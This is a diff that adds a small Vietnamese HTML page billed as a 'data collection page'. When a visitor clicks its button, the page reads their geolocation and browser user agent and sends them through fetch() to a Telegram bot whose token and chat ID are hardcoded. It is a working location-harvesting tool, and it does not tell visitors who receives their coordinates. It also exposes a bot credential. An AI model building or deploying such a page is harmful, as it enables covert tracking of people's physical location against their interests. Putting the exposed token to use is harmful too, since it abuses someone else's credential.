@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gửi Dữ Liệu đến Telegram</title>
+</head>
+<body>
+    <h1>Chào mừng đến với trang thu thập dữ liệu</h1>
+    <button id="sendData">Gửi Dữ Liệu</button>
+
+    <script>
+        document.getElementById('sendData').addEventListener('click', function() {
+            // Kiểm tra xem trình duyệt có hỗ trợ Geolocation không
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const userAgent = navigator.userAgent;
+
+                    // Tạo thông điệp để gửi
+                    const message = `Vị trí: ${latitude}, ${longitude}\nThiết bị: ${userAgent}`;
+
+                    // Gửi dữ liệu đến bot Telegram
+                    sendDataToTelegram('6956722046', message);
+                }, function(error) {
+                    console.error('Lỗi khi lấy vị trí:', error);
+                });
+            } else {
+                alert("Trình duyệt của bạn không hỗ trợ Geolocation.");
+            }
+        });
+
+        function sendDataToTelegram(chatId, message) {
+            const token = '7685472109:AAFKWzJiOFd9_nC_hT6dHVZZ4V7Z78Tq4Sw';
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error('Lỗi:', error));
+        }
+    </script>
+</body>
+</html>
